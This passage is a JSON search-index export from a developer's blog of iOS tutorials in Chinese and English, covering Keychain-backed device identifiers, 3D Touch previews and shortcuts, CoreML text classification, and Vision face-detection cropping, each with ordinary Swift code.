party，酒水食物場地都很有誠意，聽前輩們的真心話吐露，很輕鬆有趣之外還吸收許多職場軟實力．台大後台咖啡我才知道原來這是第一屆，真的有榮幸能夠參加，所有工作人員跟講者辛苦了！去參加研討會的目的不外乎就是要： 增加廣度 ，吸收新知、了解生態、碰一些平常不會接觸的項目跟 增加深度 ，如果是自己已經摸過的項目就是去聽聽看有沒有遺漏的地方或是還有其他做法沒發現．抄了許多筆記可以回來慢慢研究回味。UUID的那些事因為我聽完回去後馬上實際應用到APP上；這堂是由Zonble前輩主講，我聽到從iPhone OS 2寫到iOS 12我就跪了；由於入行較晚，我是從iOS 11/Swift 4 才開始寫，所以沒碰到那些因為蘋果修改API的動亂時期。想想UUID從可以取得到封鎖也是蠻合理的；如果是用在良善的地方：辨識使用者裝置、廣告或第三方運用唯一性去做廣告操作；但如果有廠商想做惡，也可以透過這個機制反查，知道你這隻手機的主人是怎麼樣的人？(例如有裝旅遊+台北等公車＋BMW APP+嬰兒照護 就能推測你很常出國家裡有小孩而且住在台北 之類的資訊)再加上你在APP上輸入的個資，能拿去做什麼應用不敢想像但這其中也波及到很多正當守法的用戶，像是本來用UUID當使用者的資料解密KEY或用UUID當裝置判斷都受到很大的影響；真佩服那個時期的工程師前輩們，這些影響老闆跟使用者一定會狂罵，要急中生智找其他替代辦法．替代方案：本篇文章以取得UUID辨識裝置唯一值為主，如果是要找知道使用者裝了哪些APP的替代方案可參考以下關鍵字搜尋做法： UIPasteboard pasteboardWithName: create: (運用剪貼簿在APP間共享) 、canOpenURL: info.plist LSApplicationQueriesSchmes (運用canOpenURL檢查APO有無安裝，要在info.plist列舉，最多50筆) 用MAC Address當UUID，但後來也被BAN了 Finger Printing (Canvas/User-Agent…) ：沒研究，不過這項目主要拿來讓safari跟app能產生同樣的UUID， Deferred Deep Linking (延遲深度連結)用AmIUnique? ID entifier F or V endor (IDFV)：目前主流的解決方案🏆概念是蘋果會根據你的Bundle ID前輟為使用者產生UUID，相同的Bundle ID前輟會產生相同的UUID，例如:com.518.work/com.518.job 同個裝置會得到相同的UUID如同原文ID For Vendor，相同的前輟蘋果認為即是相同廠商的APP，所以共享UUID是允許的。ID entifier F or V endor (IDFV)：let DEVICE_UUID:String = UIDevice.current.identifierForVendor?.uuidString ?? UUID().uuidString唯需注意：當所有同Vendor的APP都移除後再重裝就會產生新的UUID ( com.518.work跟com.518.job都被刪除，再裝回com.518.work這時就會產生新的UUID ) 同理如果你只有一個APP，刪掉重裝就會產生新的UUID因為這個特性，我們公司的其他APP是使用Key-Chain來解決這個問題，聽了講者前輩的指點也驗證了這個做法是正確的！流程如下：Key-Chain UUID欄位有值時取值，無則取IDFA的UUID值並回寫Key-Chain 寫入方式：if let data = DEVICE_UUID.data(using: .utf8) { let query = [ kSecClass as String : kSecClassGenericPassword as String, kSecAttrAccount as String : \"DEVICE_UUID\", kSecValueData as String : data ] as [String : Any] SecItemDelete(query as CFDictionary) SecItemAdd(query as CFDictionary, nil)}Key-Chain 讀取方式：let query = [ kSecClass as String : kSecClassGenericPassword, kSecAttrAccount as String : \"DEVICE_UUID\", kSecReturnData as String : kCFBooleanTrue, kSecMatchLimit as String : kSecMatchLimitOne ] as [String : Any]var dataTypeRef: AnyObject? = nillet status: OSStatus = SecItemCopyMatching(query as CFDictionary, &amp;dataTypeRef)if status == noErr,let dataTypeRef = dataTypeRef as? Data,let uuid = String(data:dataTypeRef, encoding: .utf8) { //uuid} 如果嫌 Key-Chain 操作太繁瑣可以自行封裝或使用第三方套件。完整CODE：let DEVICE_UUID:String = { let query = [ kSecClass as String : kSecClassGenericPassword, kSecAttrAccount as String : \"DEVICE_UUID\", kSecReturnData as String : kCFBooleanTrue, kSecMatchLimit as String : kSecMatchLimitOne ] as [String : Any] var dataTypeRef: AnyObject? = nil let status: OSStatus = SecItemCopyMatching(query as CFDictionary, &amp;dataTypeRef) if status == noErr,let dataTypeRef = dataTypeRef as? Data,let uuid = String(data:dataTypeRef, encoding: .utf8) { return uuid } else { let DEVICE_UUID:String = UIDevice.current.identifierForVendor?.uuidString ?? UUID().uuidString if let data = DEVICE_UUID.data(using: .utf8) { let query = [ kSecClass as String : kSecClassGenericPassword as String, kSecAttrAccount as String : \"DEVICE_UUID\", kSecValueData as String : data ] as [String : Any] SecItemDelete(query as CFDictionary) SecItemAdd(query as CFDictionary, nil) } return DEVICE_UUID }}()因為我在其他Extension Target也需要參照所以直接包成一個閉包參數使用有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 4,574 Total Views Last Statistics Date: 2025-08-15 | 4,516 Views on Medium." }, { "title": "提升使用者體驗，現在就為您的 iOS APP 加上 3D TOUCH 功能(Swift)", "url": "/posts/zrealm-dev/%E6%8F%90%E5%8D%87%E4%BD%BF%E7%94%A8%E8%80%85%E9%AB%94%E9%A9%97-%E7%8F%BE%E5%9C%A8%E5%B0%B1%E7%82%BA%E6%82%A8%E7%9A%84-ios-app-%E5%8A%A0%E4%B8%8A-3d-touch-%E5%8A%9F%E8%83%BD-swift-1ca246e27273/", "categories": "ZRealm Dev.", "tags": "ios, swift, 3d-touch, iphone, ios-app-development", "date": "2018-10-18 22:36:57 +0800", "snippet": "[Deprecated]提升使用者體驗，現在就為您的 iOS APP 加上 3D TOUCH 功能(Swift)iOS 3D TOUCH 應用[Deprecated] 2020/06/14 iPhone 11 以上版本已取消 3D Touch 功能；改用 Haptic Touch 取代，實作方式也有所不同。前陣子在專案開發閒暇之時，探索了許多 iOS 的有趣功能： CoreML 、 Vis...", "content": "[Deprecated]提升使用者體驗，現在就為您的 iOS APP 加上 3D TOUCH 功能(Swift)iOS 3D TOUCH 應用[Deprecated] 2020/06/14 iPhone 11 以上版本已取消 3D Touch 功能；改用 Haptic Touch 取代，實作方式也有所不同。前陣子在專案開發閒暇之時，探索了許多 iOS 的有趣功能： CoreML 、 Vision 、 Notification Service Extension 、Notification Content Extension、Today Extension、Core Spotlight、Share Extension、SiriKit (部分已整理成文章、其他項目敬請期待🤣)其中還有今日的主角： 3D Touch功能這個早在 iOS 9/iPhone 7之後 就開始支援的功能，直到我自己從iPhone 6換到iPhone 8 後才體會到它的好用之處！3D Touch能在APP中實做兩個項目，如下：1. Preview ViewController 預覽功能 — 結婚吧APP2. 3D Touch Shortcut APP 捷徑啟動功能其中第一項是應用最廣且效果最好的 (Facebook:動態消息內容預覽、Line:偷看訊息)，第二項 APP 捷徑啟動 目前看數據是鮮少人使用所以放最後在講。1. Preview ViewController 預覽功能：功能展示如上圖1所示，ViewController 預覽功能支援 3D Touch重壓時背景虛化 3D Touch重壓住時跳出ViewController預覽視窗 3D Touch重壓住時跳出ViewController預覽視窗，往上滑可在下方加入選項選單 3D Touch重壓放開返回視窗 3D Touch重壓後再用力進入目標ViewController這裡將分 A:列表視窗 、 B:目標視窗 個別列出要實作的程式碼：由於在 B中 沒有方式能判斷當前是預覽還是真的進入此視窗，所以我們先建立一個Protocol傳遞值，用來判斷protocol UIViewControllerPreviewable { var is3DTouchPreview:Bool {get set}}這樣我們就能在 B中 做以下判斷：class BViewController:UIViewController, UIViewControllerPreviewable { var is3DTouchPreview:Bool = false override func viewDidLoad() { super.viewDidLoad() if is3DTouchPreview { //若為預覽視窗時...例如：變全螢幕、隱藏工具列 } else { //完整模式時照正常顯示 } }A:列表視窗，可以是 UITableView 或 UICollectionView：class AViewController:UIViewController { //註冊能3D Touch 的 View override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) { super.traitCollectionDidChange(previousTraitCollection) if traitCollection.forceTouchCapability == .available { //TableView: registerForPreviewing(with: self, sourceView: self.TableView) //CollectionView: registerForPreviewing(with: self, sourceView: self.CollectionView) } } }extension AViewController: UIViewControllerPreviewingDelegate { //3D Touch放開後，要做的處理 func previewingContext(_ previewingContext: UIViewControllerPreviewing, commit viewControllerToCommit: UIViewController) { //現在要直接跳轉的該頁面了，所以將ViewController的預覽模式參數取消： if var viewControllerToCommit = viewControllerToCommit as? UIViewControllerPreviewable { viewControllerToCommit.is3DTouchPreview = false } self.navigationController?.pushViewController(viewControllerToCommit, animated: true) } //控制3D Touch的Cell位置，欲顯示的ViewController func previewingContext(_ previewingContext: UIViewControllerPreviewing, viewControllerForLocation location: CGPoint) -&gt; UIViewController? { //取得當前點的indexPath/cell實體 //TableView: guard let indexPath = TableView.indexPathForRow(at: location),let cell = TableView.cellForRow(at: indexPath) else { return nil } //CollectionView: guard let indexPath = CollectionView.indexPathForItem(at: location),let cell = CollectionView.cellForItem(at: indexPath) else { return nil } //欲顯示的ViewController let targetViewController = UIStoryboard(name: \"StoryboardName\", bundle: nil).instantiateViewController(withIdentifier: \"ViewControllerIdentifier\") //背景虛化時保留區域(一般為點擊位置)，附圖1 previewingContext.sourceRect = cell.frame //3D Touch視窗大小，預設為自適應，不需更改 //要修改請用：targetViewController.preferredContentSize = CGSize(width: 0.0, height: 0.0) //告知預覽的ViewController目前為預覽模式： if var targetViewController = targetViewController as? UIViewControllerPreviewable { targetViewController.is3DTouchPreview = true } //回傳nil則無任何作用 return nil }} 請注意！其中的註冊能3D Touch 的 View 這塊要放在 traitCollectionDidChange 之中而非 “viewDidLoad” ( 請參考此篇內容 ) 關於要加放在哪裡這塊我踩了許多雷，網路有些資料寫viewDidLoad、有的寫在cellforItem中，但這兩個地方都會出現偶爾失效或部分cell失效的問題。附圖1 背景虛化保留區示意圖如果您需要上滑後在下方加入選項選單請在 B 之中加入，是B 是B 是B哦！override var previewActionItems: [UIPreviewActionItem] { let profileAction = UIPreviewAction(title: \"查看商家資訊\", style: .default) { (action, viewController) -&gt; Void in //點擊後的操作 } return [profileAction]}回傳空陣列表示不使用此功能。完成！2. APP 捷徑啟動第一步在 info.plist 中加入 UIApplicationShortcutItems 參數，類型 Array並在其中新增選單項目(Dictionary)，其中Key-Value的設定對應如下： [必填] UIApplicationShortcutItemType : 識別字串，在AppDelegate中做判斷使用 [必填] UIApplicationShortcutItemTitle : 選項標題 UIApplicationShortcutItemSubtitle : 選項子標題 UIApplicationShortcutItemIconType : 使用系統圖標參考自 此篇文章 UIApplicationShortcutItemIconFile : 使用自定義圖標(size:35x35,單色)，與UIApplicationShortcutItemIconType擇ㄧ使用 UIApplicationShortcutItemUserInfo : 更多附加資訊EX: [id:1]我的設定如上圖第二步在AppDelegate中新增處理的 Functionfunc application(_ application: UIApplication, performActionFor shortcutItem: UIApplicationShortcutItem, completionHandler: @escaping (Bool) -&gt; Void) { var info = shortcutItem.userInfo switch shortcutItem.type { case \"searchShop\": // case \"topicList\": // case \"likeWorksPic\": // case \"marrybarList\": // default: break } completionHandler(true)}完成！結語在APP中加入 3D Touch的功能並不難，對使用者來說也會覺得很貼心❤；可以搭配設計操作增加使用者體驗；但目前就只有上述兩個功能可做在加上iPhone 6s以下/iPad/iPhone XR都不支援3D Touch所以實際能做的功能又更少了，只能以輔助、增加體驗為主。p.s.如果你測的夠細會發現以上效果，在CollectionView滑動中圖有部分已經滑出畫面這時按壓就會出現以上情況😅有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 569 Total Views Last Statistics Date: 2025-08-15 | 537 Views on Medium." }, { "title": "嚐鮮 iOS 12 CoreML — 使用機器學習自動預測文章分類，連模型也自己訓練！", "url": "/posts/zrealm-dev/%E5%9A%90%E9%AE%AE-ios-12-coreml-%E4%BD%BF%E7%94%A8%E6%A9%9F%E5%99%A8%E5%AD%B8%E7%BF%92%E8%87%AA%E5%8B%95%E9%A0%90%E6%B8%AC%E6%96%87%E7%AB%A0%E5%88%86%E9%A1%9E-%E9%80%A3%E6%A8%A1%E5%9E%8B%E4%B9%9F%E8%87%AA%E5%B7%B1%E8%A8%93%E7%B7%B4-793bf2cdda0f/", "categories": "ZRealm Dev.", "tags": "swift, ios, machine-learning, natural-language-process, ios-app-development", "date": "2018-10-17 23:20:35 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.嚐鮮 iOS 12 CoreML — 使用機器學習自動預測文章分類，連模型也自己訓練！探索CoreML 2.0，如何轉換或訓練模型及將其應用在實際產品上接續 上一篇 針對在 iOS上使用機器學習的研究，本篇正式切入使用Core...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.嚐鮮 iOS 12 CoreML — 使用機器學習自動預測文章分類，連模型也自己訓練！探索CoreML 2.0，如何轉換或訓練模型及將其應用在實際產品上接續 上一篇 針對在 iOS上使用機器學習的研究，本篇正式切入使用CoreML首先簡述一下歷史，蘋果在2017年發布了CoreML(包含上篇文章介紹的Vision) 機器學習框架；2018緊接著推出CoreML 2.0，除 效能提升 外還支援 自訂客製化CoreML模型 。前言如果你只是聽過「機器學習」這個名詞而不清楚他的意思的話，這邊用一句話簡單說明： 「依照你過往的經驗去預測未來同樣事情的結果」 例如：我吃蛋餅要加番茄醬，買過幾次後早餐店老闆娘就會記得，「帥哥，加番茄醬？」我回答：「是」 — 老闆娘預測正確；若回答「不是，因為是蘿蔔糕+蛋餅」 — 老闆娘記得並再下次遇到相同情況修正他的問題． 輸入的資料：蛋餅、起司蛋餅、蛋餅+蘿蔔糕、蘿蔔糕、蛋 輸出的資料：要加番茄醬/不加番茄醬 模型：老闆娘的記憶跟判斷其實我對機器學習的認知，也是在純粹知道概念理論，但沒實際深入了解過，如有錯誤請大家多多指教提到這就要順便拜🛐一下蘋果大神，把機器學習產品化，只要知道基本概念就能操作，不用具備龐大的知識基礎，降低入門門檻，我自己也是在實作過這個範例後，才第一次覺得有接觸到機器學習的踏實感，讓我對這個項目產生很大的興趣．開始第一步，最重要的當然是前面所提到的「模型」，模型從哪來呢？有三種方式： 網路找別人訓練好的模型並轉成CoreML的格式Awesome-CoreML-Models 這個GitHub專案搜集很多別人訓練好的模型模型轉換可參考 官網 或網路資料 蘋果 Machine Learning官網 最下方的 Download Core ML Models ，可以下載蘋果幫我們訓練好的模型 (主要是拿來學習或測試而已) 運用工具自己訓練模型🏆所以，能做什麼？ 圖片辨識 🏆 文字內容識別分類🏆 文字斷詞 文字語言判斷 名詞識別斷詞請參考 在 iOS App 中進行自然語言處理：初探 NSLinguisticTagger今日主要重點 — 文字內容識別分類＋ 自己訓練模型講白話就是，我們給機器「文字內容」跟「分類」訓練電腦對未來的資料做分類．例如：「點擊查看最新優惠！」、「1000$購物金馬上領」=&gt;「廣告」；「Alan發送一則訊息給您」、「您的帳戶即將到期」=&gt;「重要事項」實際應用：垃圾信件判別、標籤產生、分類預測p.s 由於圖片辨識我還沒想到能訓練它做什麼，所以就沒去研究了；有興趣的朋友可以看 這篇 ，官方有提供圖片的GUI訓練工具 很方便！！需求工具： MacOS Mojave⬆ + Xcode 10訓練工具： BlankSpace007/TextClassiferPlayground （官方只提供 圖片的GUI訓練工具 ，文字的要自己寫；這是由網路大神提供的第三方工具）準備訓練資料：資料結構如上圖，支援.json,.csv檔準備好要拿來訓練的資料，這裡以用Phpmyadmin(Mysql) 匯出訓練資料SELECT `title` AS `text`,`type` AS `label` FROM `posts` WHERE `status` = '1'匯出方式更改成JSON格式[ {\"type\":\"header\",\"version\":\"4.7.5\",\"comment\":\"Export to JSON plugin for PHPMyAdmin\"}, {\"type\":\"database\",\"name\":\"db\"}, {\"type\":\"table\",\"name\":\"posts\",\"database\":\"db\",\"data\": //以上刪除 [ { \"label\":\"\", \"text\":\"\" } ] //以下刪除 }]打開剛下載的JSON檔案，只留下中間DATA結構裡的內容使用訓練工具：下載好訓練工具後，點擊 TextClassifer.playground 打開 Playground點擊紅匡執行-&gt;點擊綠匡切換View顯示將JSON檔案拉入GUI工具打開下方Console查看訓練進度，看到「測試正確率」這行代表已完成模型訓練資料太多就要考驗考驗你的電腦處理能力。填寫基本訊息後按「保存」保存下訓練好的模型檔案CoreML 模型檔到此你的模型就已經訓練好囉！是不是很容易具體訓練方式： 先將輸入的語句做斷詞(我想知道婚禮需要準備什麼=&gt;我想,知道,婚禮,需要,準備,什麼)，再看他的分類是什麼做一連串的機器學習計算。 將訓練資料分組，例如: 80% 是拿來訓練另外20%是拿來測試驗證到這邊已經完成大部分的工作，接下來只要把模型檔加入iOS 專案中，寫個幾行程式就行囉。將模型檔案( * .mlmodel) 拖曳/加入專案之中程式部分：import CoreML//if #available(iOS 12.0, *),let prediction = try? textClassifier().prediction(text: \"要預測的文字內容\") { let type = prediction.label print(\"我覺得是...\\(type)\")}完工！待探索問題： 可以支持再學習？ 可以將mlmodel模型檔轉換到其他平台？ 能再iOS上訓練模型？以上三點，目前查到的資料是都不行。結語：目前我將其應用在實務APP上，做文章發文時預測他的分類結婚吧APP我拿去訓練資料約才100筆，目前預測命中率約35%，主要為實驗性質而已。— — — — —就是這麼簡單，完成人生中第一個機器學習項目；其中背景如何運作還有很長的路可以學習，希望這個項目能給大家一些啟發！參考資料： WWDC2018之Create ML(二)有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,662 Total Views Last Statistics Date: 2025-08-15 | 1,637 Views on Medium." }, { "title": "Exploring iOS 12 CoreML — Using Machine Learning to Automatically Predict Article Categories, with Self-Training Models!", "url": "/posts/zrealm-dev/en/exploring-ios-12-coreml-using-machine-learning-to-automatically-predict-article-categories-with-self-training-models-793bf2cdda0f/", "categories": "ZRealm Dev.", "tags": "swift, ios, machine-learning, natural-language-process, ios-app-development", "date": "2018-10-17 23:20:35 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Exploring iOS 12 CoreML — Using Machine Learning to Automatically Predict Article Ca...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Exploring iOS 12 CoreML — Using Machine Learning to Automatically Predict Article Categories, with Self-Training Models!Discover how to use CoreML 2.0 to convert or train models and apply them in real products.Following up on the previous article about using machine learning on iOS, this piece dives into using CoreML.First, a brief history: Apple released CoreML (which includes the Vision framework mentioned in the last article) in 2017. In 2018, they quickly followed up with CoreML 2.0, which not only improved performance but also supported custom CoreML models.IntroductionIf you’ve only heard the term “machine learning” but aren’t quite sure what it means, here’s a simple explanation: “Predicting the outcome of future events based on past experiences.”For example: If I always add ketchup to my egg pancake, after a few visits, the breakfast shop owner will remember, “Hey, handsome, ketchup?” If I respond, “Yes,” she predicts correctly; if I say, “No, because it’s radish cake + egg pancake,” she remembers and adjusts her prediction next time. Input data: egg pancake, cheese egg pancake, egg pancake + radish cake, radish cake, eggOutput data: add ketchup / do not add ketchupModel: the owner’s memory and judgmentHonestly, my understanding of machine learning has been purely theoretical until now, so if there are any mistakes, please feel free to correct me.Speaking of which, I must give a shout-out to Apple for making machine learning accessible. With just a basic understanding, anyone can operate it without needing extensive knowledge, lowering the entry barrier. After implementing this example, I finally felt a tangible connection to machine learning, sparking my interest in the field.Getting StartedThe first step, of course, is the “model” mentioned earlier. Where do models come from?There are three ways: Find pre-trained models online and convert them to CoreML format.The Awesome-CoreML-Models GitHub project collects many pre-trained models.For model conversion, refer to the official website or other online resources. Download pre-trained models from Apple’s Machine Learning website (mainly for learning or testing purposes). Use tools to train your own model🏆.So, what can you do? Image recognition 🏆 Text content classification🏆 Word segmentation Language detection Named entity recognitionFor word segmentation, refer to Natural Language Processing in iOS Apps: An Introduction to NSLinguisticTagger.Today’s Main Focus — Text Content Classification + Self-Training ModelsIn simple terms, we provide the machine with “text content” and “categories” to train it to classify future data. For example: “Click to see the latest offers!” or “Claim your $1000 shopping voucher now” =&gt; “Advertisement”; “Alan sent you a message” or “Your account is about to expire” =&gt; “Important Notice.”Practical applications include spam detection, label generation, and classification prediction.p.s. I haven’t figured out what to train for image recognition yet, so I didn’t explore that; interested readers can check out this article where the official GUI training tool for images is provided — it’s very convenient!Required Tools: MacOS Mojave⬆ + Xcode 10Training Tool: BlankSpace007/TextClassiferPlayground (the official tool only provides a GUI training tool for images, while text requires custom coding; this is a third-party tool provided by a community expert).Preparing Training Data:The data structure is as shown, supporting .json and .csv files.Prepare the training data; here, I’m exporting training data using PhpMyAdmin (MySQL):SELECT `title` AS `text`, `type` AS `label` FROM `posts` WHERE `status` = '1'Change the export format to JSON:[ {\"type\":\"header\",\"version\":\"4.7.5\",\"comment\":\"Export to JSON plugin for PHPMyAdmin\"}, {\"type\":\"database\",\"name\":\"db\"}, {\"type\":\"table\",\"name\":\"posts\",\"database\":\"db\",\"data\": // Remove the above [ { \"label\":\"\", \"text\":\"\" } ] // Remove the below }]Open the downloaded JSON file and keep only the content within the DATA structure.Using the Training Tool:After downloading the training tool, click on TextClassifer.playground to open the Playground.Click the red box to run -&gt; Click the green box to switch view display.Drag the JSON file into the GUI tool.Open the console below to check training progress; seeing “Test Accuracy” means model training is complete.If the data is too large, it will test your computer’s processing power.Fill in basic information and click “Save.”Save the trained model file.CoreML model file.At this point, your model is trained! Isn’t that easy?Specific Training Method: First, segment the input sentences (e.g., “I want to know what to prepare for a wedding” becomes “I want, to know, wedding, need, prepare, what”), and then perform a series of machine learning calculations based on their categories. Group the training data, for example: 80% for training and 20% for testing and validation.At this point, most of the work is done; next, just add the model file to your iOS project and write a few lines of code.![Drag the model file (.mlmodel) into the project](/assets/793bf2cdda0f/14Uc1elBmhEnQ-J8z_RIQHQ.webp){: lqip=”data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjcxMiI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==” }Drag the model file (*.mlmodel) into the project.Code Section:import CoreML//if #available(iOS 12.0, *), let prediction = try? textClassifier().prediction(text: \"Text content to predict\") { let type = prediction.label print(\"I think it's...\\(type)\")}Done!Questions to Explore: Can it support re-learning? Can the mlmodel file be converted to other platforms? Can models be trained on iOS?As for these three points, the information I’ve found so far suggests that none of them are possible.Conclusion:I am currently applying this in a practical app to predict article categories when posting.Wedding AppI trained the model with only about 100 samples, and the current prediction accuracy is around 35%, mainly for experimental purposes.— — — — —It’s that simple to complete my first machine learning project! There’s still a long way to go in understanding how the background works, but I hope this project inspires everyone!References: WWDC2018 Create ML (Part 2).If you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,662 Total Views Last Statistics Date: 2025-08-15 | 1,637 Views on Medium." }, { "title": "Vision 初探 — APP 頭像上傳 自動識別人臉裁圖 (Swift)", "url": "/posts/zrealm-dev/vision-%E5%88%9D%E6%8E%A2-app-%E9%A0%AD%E5%83%8F%E4%B8%8A%E5%82%B3-%E8%87%AA%E5%8B%95%E8%AD%98%E5%88%A5%E4%BA%BA%E8%87%89%E8%A3%81%E5%9C%96-swift-9a9aa892f9a9/", "categories": "ZRealm Dev.", "tags": "swift, machine-learning, facedetection, ios, ios-app-development", "date": "2018-10-17 00:01:24 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Vision 初探 — APP 頭像上傳 自動識別人臉裁圖 (Swift)Vision 實戰應用[2024/08/13 Update] 請參考新文章、新的 API：「 iOS Vision framework x WWDC ...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Vision 初探 — APP 頭像上傳 自動識別人臉裁圖 (Swift)Vision 實戰應用[2024/08/13 Update] 請參考新文章、新的 API：「 iOS Vision framework x WWDC 24 Discover Swift enhancements in the Vision framework Session 」一樣不多說，先上一張成品圖：優化前 V.S 優化後 — 結婚吧APP前陣子iOS 12發佈更新，注意到新開放的CoreML 機器學習框架；覺得挺有趣的，就開始構想如果想用在當前的產品上能放在哪裡？ CoreML嚐鮮文章現已發佈： 使用機器學習自動預測文章分類，連模型也自己訓練CoreML提供文字、圖像的機器學習模型訓練及引用到APP裡的接口，我原先的想法是，使用CoreML來做到人臉識別，解決APP中有裁圖的項目頭或臉被卡掉的問題，如上圖左所示，若人臉出現在周圍則很容易因為縮放＋裁圖造成臉不完整．經過網路搜尋一番後才發現我學識短淺，這個功能在iOS 11就已發佈：「Vision」框架，支援文字偵測、人臉偵測、圖像比對、QRCODE偵測、物件追蹤…功能這邊使用的就是其中的人臉偵測項目，經優化後如右圖所示；找到人臉並以此為中心裁圖．實戰開始：首先我們先做能標記人臉位置的功能，初步認識一下Vision怎麼用Demo APP完成圖如上所示，能標記出照片中人臉的位置p.s 僅能標記「人臉」，整個頭包含頭髮並不行😅這塊程式主要分為兩部分，第一部分要解決 圖片原尺寸縮放放入 ImageView時會留白的狀況；簡單來說我們要的是Image的Size多大，ImageView的Size就有多大，若直接放入圖片會造成如下走位情形你可能會想說直接改ContentMode變成fill、fit、redraw，但就會變形或圖片被卡掉let ratio = UIScreen.main.bounds.size.width//這邊是因為我UIIMAGEVIEW 那邊設定左右對齊0，寬高比1:1let sourceImage = UIImage(named: \"Demo2\")?.kf.resize(to: CGSize(width: ratio, height: CGFloat.leastNonzeroMagnitude), for: .aspectFill)//使用KingFisher的圖片變形功能，已寬為基準，高度自由imageView.contentMode = .redraw//contentMode使用redraw填滿imageView.image = sourceImage//賦予圖片imageViewConstraints.constant = (ratio - (sourceImage?.size.height ?? 0))imageView.layoutIfNeeded()imageView.sizeToFit()//這一塊是我去改變 imageView的Constraints，詳情可看文末完整範例以上就是針對圖片做的處理裁圖部分使用Kingfisher幫助我們，也可替換成其他套件或自刻方法第二部分，進入重點直接看Codeif #available(iOS 11.0, *) { //iOS 11之後才支援 let completionHandle: VNRequestCompletionHandler = { request, error in if let faceObservations = request.results as? [VNFaceObservation] { //辨識到的臉臉們 DispatchQueue.main.async { //操作UIVIEW，切回主執行緒 let size = self.imageView.frame.size faceObservations.forEach({ (faceObservation) in //坐標系轉換 let translate = CGAffineTransform.identity.scaledBy(x: size.width, y: size.height) let transform = CGAffineTransform(scaleX: 1, y: -1).translatedBy(x: 0, y: -size.height) let transRect = faceObservation.boundingBox.applying(translate).applying(transform) let markerView = UIView(frame: transRect) markerView.backgroundColor = UIColor.init(red: 0/255, green: 255/255, blue: 0/255, alpha: 0.3) self.imageView.addSubview(markerView) }) } } else { print(\"未偵測到任何臉\") } } //辨識請求 let baseRequest = VNDetectFaceRectanglesRequest(completionHandler: completionHandle) let faceHandle = VNImageRequestHandler(ciImage: ciImage, options: [:]) DispatchQueue.global().async { //辨識需要時間，所以放入背景子執行緒執行，避免當前畫面卡住 do{ try faceHandle.perform([baseRequest]) }catch{ print(\"Throws：\\(error)\") } } } else { // print(\"不支援\")}主要要注意的是，坐標系轉換部分；辨識出來的結果是Image的原始座標；我們須將它轉換成包在外面的ImageView的實際座標才能正確地使用它．再來我們來做今天的重頭戲 — 依照人臉的位置裁切出大頭貼的正確位置let ratio = UIScreen.main.bounds.size.width//這邊是因為我UIIMAGEVIEW 那邊設定左右對齊0，寬高比1:1，詳情可看文末完整範例let sourceImage = UIImage(named: \"Demo\")imageView.contentMode = .scaleAspectFill//使用scaleAspectFill模式填滿imageView.image = sourceImage//直接賦予原圖片，我們之後再操作if let image = sourceImage,#available(iOS 11.0, *),let ciImage = CIImage(image: image) { let completionHandle: VNRequestCompletionHandler = { request, error in if request.results?.count == 1,let faceObservation = request.results?.first as? VNFaceObservation { //ㄧ張臉 let size = CGSize(width: ratio, height: ratio) let translate = CGAffineTransform.identity.scaledBy(x: size.width, y: size.height) let transform = CGAffineTransform(scaleX: 1, y: -1).translatedBy(x: 0, y: -size.height) let finalRect = faceObservation.boundingBox.applying(translate).applying(transform) let center = CGPoint(x: (finalRect.origin.x + finalRect.width/2 - size.width/2), y: (finalRect.origin.y + finalRect.height/2 - size.height/2)) //這裡是計算臉的範圍中間點位置 let newImage = image.kf.resize(to: size, for: .aspectFill).kf.crop(to: size, anchorOn: center) //將圖片依照中間點裁切 DispatchQueue.main.async { //操作UIVIEW，切回主執行緒 self.imageView.image = newImage } } else { print(\"偵測到多張臉或沒有偵測到臉\") } } let baseRequest = VNDetectFaceRectanglesRequest(completionHandler: completionHandle) let faceHandle = VNImageRequestHandler(ciImage: ciImage, options: [:]) DispatchQueue.global().async { do{ try faceHandle.perform([baseRequest]) }catch{ print(\"Throws：\\(error)\") } }} else { print(\"不支援\")}道理跟標記人臉位置差不多，差別在大頭貼的部分是固定尺寸(如:300x300)，所以我們略過前面需要讓Image適應ImageView的第一部分另一個差別是我們要多計算人臉範圍的中心點，並以這個中心點為準做裁切圖片紅點為臉的範圍中心點完成效果圖：頓丹前的那一秒是原始圖位置完整APP範例:程式碼已上傳至Github： 請點此有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,364 Total Views Last Statistics Date: 2025-08-15 | 1,324 Views on Medium." }, { "title": "Exploring Vision — Automatic Face Detection and Cropping for App Profile Pictures (Swift)", "url": "/posts/zrealm-dev/en/exploring-vision-automatic-face-detection-and-cropping-for-app-profile-pictures-swift-9a9aa892f9a9/", "categories": "ZRealm Dev.", "tags": "swift, machine-learning, facedetection, ios, ios-app-development", "date": "2018-10-17 00:01:24 